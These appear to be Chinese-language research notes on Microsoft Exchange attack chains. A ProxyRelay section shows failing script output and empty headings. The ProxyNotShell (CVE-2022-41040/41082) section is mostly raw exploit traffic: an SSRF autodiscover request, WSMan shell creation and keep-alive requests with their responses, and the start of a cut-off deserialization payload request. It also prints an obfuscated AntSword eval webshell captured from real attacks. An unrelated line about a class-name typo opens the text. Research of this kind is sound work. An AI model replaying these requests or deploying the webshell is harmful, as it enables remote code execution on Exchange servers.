开发人员把类名写错，System.Security.ClaimsPrincipal 的正确写法应该是 System.Security.Claims.ClaimsPrincipal,直接改为正确的类名。


# ProxyRelay (test failed)
## ProxyRelay part links

 - [A New Attack Surface on MS Exchange Part 4 - ProxyRelay!](https://blog.orange.tw/2022/10/proxyrelay-a-new-attack-surface-on-ms-exchange-part-4.html)
 - [ProxyRelay](https://github.com/HuanGMZzz/ProxyRelay)

github的这个脚本报错，待后续深入研究relay attack后再来解决

``` bash
[-] Authenticating against https://192.168.14.6 as EXCHANGE2016CU2/WIN-O3C32QA97FP$ FAILED
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```
 - ![](./pics/proxyrelay-err.png)
 - [Relaying NTLM authentication over RPC](https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)

### Round 1 - Relay to Exchange FrontEnd





### Round 2 - Relay to Exchange BackEnd
#### 2-1 Attacking BackEnd /EWS


#### 2-2 Attacking BackEnd /RPC


#### 2-3 Attacking BackEnd /PowerShell


#### 2-4 Patching BackEnd




### Round 3 - Relay to Windows DCOM
#### Patching DCOM






# ProxyNotShell (completed)
## ProxyNotShell part links

 - [ProxyNotShell — the story of the claimed zero days in Microsoft Exchange](https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9)
 - [WARNING: NEW ATTACK CAMPAIGN UTILIZED A NEW 0-DAY RCE VULNERABILITY ON MICROSOFT EXCHANGE SERVER](https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html)
 - [ProxyNotShell: CVE-2022-41040 and CVE-2022-41082 Exploits Explained](https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained)
 - [Microsoft Exchange ProxyNotShell vulnerability explained and how to mitigate it](https://www.csoonline.com/article/3682762/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html)
 - [Threat Brief: CVE-2022-41040 and CVE-2022-41082: Microsoft Exchange Server (ProxyNotShell)](https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/)
 - [Analyzing attacks using the Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082](https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/)

## 漏洞POC利用及原理分析

 - [CONTROL YOUR TYPES OR GET PWNED: REMOTE CODE EXECUTION IN EXCHANGE POWERSHELL BACKEND](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend)
 - [CVE-2022-41040 and CVE-2022-41082 – zero-days in MS Exchange](https://securelist.com/cve-2022-41040-and-cve-2022-41082-zero-days-in-ms-exchange/108364/)
 - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 - [All the Proxy(Not)Shells](https://www.splunk.com/en_us/blog/security/all-the-proxy-not-shells.html)

## 详情总结

| ZDI | CVE |
| ----------- | ----------- |
| ZDI-CAN-18802 | CVE-2022-41040 |
| ZDI-CAN-18333 | CVE-2022-41082 |

该漏洞利用链为认证后RCE(需要输入账号密码)

该SSRF攻击请求入口和2021年的ProxyShell漏洞一样

 - CVE-2022-41040 poc

``` bash
GET /autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi HTTP/1.1
Host: 192.168.1.10
Authorization: Basic cG9jdXNlcjpwb2NwYXNzd2QK
Connection: close
```

成功利用CVE-2022-41040漏洞后，能向任意后端服务发送带有LocalSystem权限的URI和数据的请求

ProxyNotShell链中的第二个漏洞是CVE-2022-41082，这是一个在Exchange PowerShell后端发现的远程代码执行漏洞。它的CVSS得分为8.8(高)。攻击者通过滥用CVE-2022-41040绕过身份验证后，利用CVE-2022-41082在易受攻击的Exchange服务器上运行任意命令。

这些被攻击的Exchange服务器的版本号显示已经安装了最新的更新，因此利用之前proxyshell的Proxyshell后端的漏洞是不可能的，所以可以确认这是一个新的0day RCE漏洞利用链

此外，给出的修复手段与2021年的ProxyShell Powershell RCE完全相同

由于利用CVE-2022-41040和CVE-2022-41082攻击者利用和ProxyShell漏洞的相同SSRF->RCE攻击流程，但需要对Exchange服务器进行身份验证，所以Kevin Beaumont将此漏洞链命名为ProxyNotShell，以其前身命名。

 - 实际攻击捕获到的antsword webshell

``` bash
<%@Page Language="Jscript"%>
<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(837-763)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Wg=='))+'m'+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydF'+'WjBXS'+'WFtRG'+'Z6bU8'+'xajhk'+'J10sI'+'HNhZm'+'UpOzE'+'3MTY4'+'OTE7'+'')));%>
```

ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端口5985(HTTP)和5986(HTTPS)也在利用范围内

## ProxyNotShell 利用细节
### step1

使用XML SOAP发起PsRemoting的HTTP POST请求

通过WSMAN协议访问基于web的企业管理(WBEM)。攻击者在易受攻击的系统上启动shell，以便通过Windows远程管理(PsRemoting)进一步执行PowerShell脚本。

 - ![](pics/proxynotshell5.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 7076
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHIAAAAmASYBigAAAAAAAABYAAAAGgAaAFgAAAAAAAAAcgAAABAAEACwAQAANYKJ4gYBsR0AAAAPhC4i/YVS+VB0G4hNptNku2EAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdwnLRH74UZh1WHEOmDltNwEBAAAAAAAAZCww0zTi2QHzuBzg/jLiNgAAAAACABgARQBYAEMASABBAE4ARwBFADIAMAAxADYAAQAeAFcASQBOAC0AVQBQAEYAMAA5AFIANwBIADIANgA0AAQAIABlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGMAbwBtAAMAQABXAEkATgAtAFUAUABGADAAOQBSADcASAAyADYANAAuAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABQAgAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABwAIAGQsMNM04tkBBgAEAAIAAAAKABAA5zRZWjBRW9TZInuvk2v9vQAAAAAAAAAAhe1lJqMaH9fVr+rLcgUHxA==

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
                <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:d5a6b749-9109-4bc7-969a-4223ef795a72</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:381b8e15-dff7-4812-9867-3bc71f9b5ed3</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">

                        <w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
                </w:OptionSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
                <rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
                        <rsp:InputStreams>stdin pr</rsp:InputStreams>
                        <rsp:OutputStreams>stdout</rsp:OutputStreams>
                        <creationXml xmlns="http://schemas.microsoft.com/powershell">AAAAAAAAAAEAAAAAAAAAAAMAAADHAgAAAAIAAQCkwAes2LBAQZqGoPGMPzz/AAAAAAAAAAAAAAAAAAAAADxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPgAAAAAAAAACAAAAAAAAAAADAAAOiwIAAAAEAAEApMAHrNiwQEGahqDxjD88/wAAAAAAAAAAAAAAAAAAAAA8T2JqIFJlZklkPSIwIj48TVM+PEkzMiBOPSJNaW5SdW5zcGFjZXMiPjE8L0kzMj48STMyIE49Ik1heFJ1bnNwYWNlcyI+MTwvSTMyPjxPYmogTj0iUFNUaHJlYWRPcHRpb25zIiBSZWZJZD0iMSI+PFROIFJlZklkPSIwIj48VD5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5QU1RocmVhZE9wdGlvbnM8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPkRlZmF1bHQ8L1RvU3RyaW5nPjxJMzI+MDwvSTMyPjwvT2JqPjxPYmogTj0iQXBhcnRtZW50U3RhdGUiIFJlZklkPSIyIj48VE4gUmVmSWQ9IjEiPjxUPlN5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGU8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPlVua25vd248L1RvU3RyaW5nPjxJMzI+MjwvSTMyPjwvT2JqPjxPYmogTj0iQXBwbGljYXRpb25Bcmd1bWVudHMiIFJlZklkPSIzIj48VE4gUmVmSWQ9IjIiPjxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNQcmltaXRpdmVEaWN0aW9uYXJ5PC9UPjxUPlN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGU8L1Q+PFQ+U3lzdGVtLk9iamVjdDwvVD48L1ROPjxEQ1Q+PEVuPjxTIE49IktleSI+UFNWZXJzaW9uVGFibGU8L1M+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjQiPjxUTlJlZiBSZWZJZD0iMiIgLz48RENUPjxFbj48UyBOPSJLZXkiPlBTVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPlBTRWRpdGlvbjwvUz48UyBOPSJWYWx1ZSI+RGVza3RvcDwvUz48L0VuPjxFbj48UyBOPSJLZXkiPlBTQ29tcGF0aWJsZVZlcnNpb25zPC9TPjxPYmogTj0iVmFsdWUiIFJlZklkPSI1Ij48VE4gUmVmSWQ9IjMiPjxUPlN5c3RlbS5WZXJzaW9uW108L1Q+PFQ+U3lzdGVtLkFycmF5PC9UPjxUPlN5c3RlbS5PYmplY3Q8L1Q+PC9UTj48TFNUPjxWZXJzaW9uPjEuMDwvVmVyc2lvbj48VmVyc2lvbj4yLjA8L1ZlcnNpb24+PFZlcnNpb24+My4wPC9WZXJzaW9uPjxWZXJzaW9uPjQuMDwvVmVyc2lvbj48VmVyc2lvbj41LjA8L1ZlcnNpb24+PFZlcnNpb24+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0xTVD48L09iaj48L0VuPjxFbj48UyBOPSJLZXkiPkNMUlZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjQuMC4zMDMxOS40MjAwMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPkJ1aWxkVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+MTAuMC4xOTA0MS42MTA8L1ZlcnNpb24+PC9Fbj48RW4+PFMgTj0iS2V5Ij5XU01hblN0YWNrVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+My4wPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+UFNSZW1vdGluZ1Byb3RvY29sVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+Mi4zPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+U2VyaWFsaXphdGlvblZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjEuMS4wLjE8L1ZlcnNpb24+PC9Fbj48L0RDVD48L09iaj48L0VuPjwvRENUPjwvT2JqPjxPYmogTj0iSG9zdEluZm8iIFJlZklkPSI2Ij48TVM+PE9iaiBOPSJfaG9zdERlZmF1bHREYXRhIiBSZWZJZD0iNyI+PE1TPjxPYmogTj0iZGF0YSIgUmVmSWQ9IjgiPjxUTiBSZWZJZD0iNCI+PFQ+U3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PERDVD48RW4+PEkzMiBOPSJLZXkiPjk8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iOSI+PE1TPjxTIE49IlQiPlN5c3RlbS5TdHJpbmc8L1M+PFMgTj0iViI+QWRtaW5pc3RyYXRvcjogV2luZG93cyBQb3dlclNoZWxsPC9TPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjg8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTAiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxMSI+PE1TPjxJMzIgTj0id2lkdGgiPjI3NDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij43MjwvSTMyPjwvTVM+PC9PYmo+PC9NUz48L09iaj48L0VuPjxFbj48STMyIE49IktleSI+NzwvSTMyPjxPYmogTj0iVmFsdWUiIFJlZklkPSIxMiI+PE1TPjxTIE49IlQiPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplPC9TPjxPYmogTj0iViIgUmVmSWQ9IjEzIj48TVM+PEkzMiBOPSJ3aWR0aCI+MTIwPC9JMzI+PEkzMiBOPSJoZWlnaHQiPjcyPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij42PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LlNpemU8L1M+PE9iaiBOPSJWIiBSZWZJZD0iMTUiPjxNUz48STMyIE49IndpZHRoIj4xMjA8L0kzMj48STMyIE49ImhlaWdodCI+NTA8L0kzMj48L01TPjwvT2JqPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjU8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTYiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxNyI+PE1TPjxJMzIgTj0id2lkdGgiPjEyMDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij4zMDAwPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij40PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE4Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkludDMyPC9TPjxJMzIgTj0iViI+MjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4zPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE5Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIwIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij4wPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4yPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIxIj48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIyIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij45PC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4xPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIzIj48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4wPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjI0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjY8L0kzMj48L01TPjwvT2JqPjwvRW4+PC9EQ1Q+PC9PYmo+PC9NUz48L09iaj48QiBOPSJfaXNIb3N0TnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFVJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFJhd1VJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX3VzZVJ1bnNwYWNlSG9zdCI+ZmFsc2U8L0I+PC9NUz48L09iaj48L01TPjwvT2JqPg==</creationXml>
                </rsp:Shell>
        </s:Body>
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 9e7c0cd2-dffd-48da-8fd4-c0e272cecb1f
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc7Lxc/GgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:14:09 GMT; path=/autodiscover; secure; HttpOnly
Persistent-Auth: true
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:14:09 GMT
Content-Length: 866

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:7F45298C-DA0C-4B21-8345-C1064F467C36</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/powershell/Microsoft.Exchange</rsp:ResourceUri><rsp:Owner>exchange2016\administrator</rsp:Owner><rsp:ClientIP>fe80::841b:99cc:dec2:b8a%5</rsp:ClientIP><rsp:IdleTimeOut>PT900.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin pr</rsp:InputStreams><rsp:OutputStreams>stdout</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
```

### step2

使用XML SOAP的HTTP POST请求来延长shell的生命周期

启动shell后，攻击者立即延长其生命周期；否则，默认情况下，由于shell的过期时间太短，shell将被关闭。这是在Exchange Server上进一步执行命令所必需的。要做到这一点，攻击者立即通过启用keep alive选项的WSMAN发送一个特殊请求。

 - ![](pics/proxynotshell6.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczJgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 1731

<s:Envelope xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:9f62f84e-9ccf-47dc-9c85-44528f897ec6</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:OptionSet s:mustUnderstand="true">
            <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
        </wsman:OptionSet>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">84E4CBD2-CE57-4D84-B623-0ADD3EBAFF2A</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body>
        <rsp:Receive>
            <rsp:DesiredStream>stdout</rsp:DesiredStream>
        </rsp:Receive>
    </s:Body>
        </s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: bc066085-69d9-4848-909a-c24723f86a29
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczIgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:22:37 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:22:36 GMT
Content-Length: 678

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:6747A94B-9EB8-479A-9A52-F85A259A1B3D</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:Stream Name="stdout">AAAAAAAACmcAAAAAAAAAAAMAAADKAQAAAAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO+7vzxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPg==</rsp:Stream></rsp:ReceiveResponse></s:Body></s:Envelope>
```

### step3

使用XML SOAP启动新流程的HTTP POST请求

之后，攻击者利用第二个漏洞CVE-2022-41082。通过使用PowerShell Remoting，攻击者发送一个创建地址簿的请求，传递带有特殊payload的编码和序列化数据作为参数。在发布的PoC中，这个编码的数据包含一个名为System.UnitySerializationHolder的gadget生成System.Windows.Markup.XamlReader类的对象。该类处理来自payload的XAML数据，从而创建System.Diagnostics类的新对象。并在目标系统上打开新进程的方法调用。在网上公布的PoC中，这个进程是calc.exe。

 - ![](pics/proxynotshell7.png)

执行calc.exe进程的主payload部分

 - ![](pics/proxynotshell8.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 4071

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
